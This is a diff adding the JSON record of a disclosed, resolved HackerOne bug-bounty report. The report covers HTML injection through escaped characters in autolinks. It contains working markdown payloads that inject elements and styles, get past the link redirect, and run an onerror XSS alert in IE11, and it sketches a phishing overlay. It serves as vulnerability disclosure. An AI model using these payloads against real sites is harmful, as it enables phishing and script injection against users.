@@ -1,0 +1,122 @@
+{
+  "id": 46072,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NjA3Mg==",
+  "url": "https://hackerone.com/reports/46072",
+  "title": "Vulnerability with the way \\ escaped characters in <http://danlec.com> style links are rendered",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2015-02-01T23:52:18.498Z",
+  "submitted_at": "2015-02-01T23:52:18.498Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "danlec",
+    "url": "/danlec",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/013/404/1fb35d139fbfcb566e2513ca6c92f2dfe6cde541_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13,
+    "url": "https://hackerone.com/security",
+    "handle": "security",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "HackerOne",
+      "twitter_handle": "Hacker0x01",
+      "website": "https://hackerone.com",
+      "about": "Vulnerability disclosure should be safe, transparent, and rewarding."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2015-02-03T17:34:45.891Z",
+  "bug_reporter_agreed_on_going_public_at": "2015-02-03T17:34:45.035Z",
+  "team_member_agreed_on_going_public_at": "2015-02-02T19:07:05.856Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "> <http://\\<div\\ style=\\\"font-size:24px;background:red;color:white;width:100%;height:48px;line-height:48px;text-align:center;\\\"\\>Uh\\ oh!</div\\>>\r\n\r\n## Basic POC:\r\n\r\nSequences like `<http://\\<h1\\>test\\</h1\\>>` are rendered as `http://<h1>test</h1>`\r\n\r\n## Examples of what could be done with this:\r\n\r\nObviously there's a whole variety of stuff that can be done when you can inject arbitrary HTML, even in spite of the CSP protection.\r\n\r\nWe can put in elements we're not supposed to (see above, where we've inserted an attention grabbing `div`)\r\n\r\nWe can put in \"arbitrary\" images (i.e. profile pictures)\r\n\r\n```\r\n<http://\\<img\\ src=\\\"https://profile-photos.hackerone-user-content.com/production/000/000/013/76b3a9e70495c3b7340e33cdf5141660ae26489b_large.png?1383694562\\\"\\>\r\n```\r\n\r\n> <http://\\<img\\ src=\\\"https://profile-photos.hackerone-user-content.com/production/000/000/013/76b3a9e70495c3b7340e33cdf5141660ae26489b_large.png?1383694562\\\"\\>>\r\n\r\nWe can put in our own `<style>` tags, e.g. using\r\n\r\n```\r\n<http://\\<style\\>.markdownable\\ blockquote{color:white;border:0;padding:0;margin:0;}a{color:red !important}\\</style\\>>\r\n```\r\n\r\n> <http://\\<style\\>.markdownable\\ blockquote{color:white;border:0;padding:0;margin:0;}a{color:red\\ !important}\\</style\\>>\r\n\r\n## Serious Exploits\r\n\r\nWe can bypass HackerOne's link /redirect:\r\n\r\n```\r\n<http://\\<a\\ href=\\\"http://danlec.com\\\"\\>Redirect\\ bypassed\\</a\\>>\r\n```\r\n\r\nIf we wanted to be particularly sneaky, we could use CSS to make a link cover the whole submission, so clicking anywhere would activate the link … which might allow us to do some phishing by having the link go to a fake HackerOne login screen.\r\n\r\n> <http://\\<a\\ href=\\\"http://danlec.com\\\"\\>Redirect\\ bypassed\\</a\\>>\r\n\r\nFor browsers without good CSP support, like IE11, we can use this to run script on a victim when they try to view our submission using\r\n\r\n```\r\n<http://\\<img\\ style=\\\"display:none\\\"\\ src=0\\ onerror=\\\"alert(\\'Uh\\ oh\\')\\\"\\>>\r\n```\r\n\r\n> <http://\\<img\\ style=\\\"display:none\\\"\\ src=0\\ onerror=\\\"alert(\\'Uh\\ oh\\')\\\"\\>>\r\n\r\n(If you're using IE11 for some reason, you'll get an alert when you view this submission)\r\n",
+  "bounty_amount": "5000.0",
+  "formatted_bounty": "$5,000",
+  "weakness": {
+    "id": 60,
+    "name": "Cross-site Scripting (XSS) - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2015-03-04T19:07:06.642Z",
+  "allow_singular_disclosure_after": -352844418.6128651,
+  "singular_disclosure_allowed": true,
+  "vote_count": 19,
+  "voters": [
+    "dirk",
+    "cxzer0",
+    "sw33tlie",
+    "inhibitor181",
+    "ali",
+    "spam404",
+    "xsam",
+    "karel_origin",
+    "r3y",
+    "khizer47",
+    "and 9 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
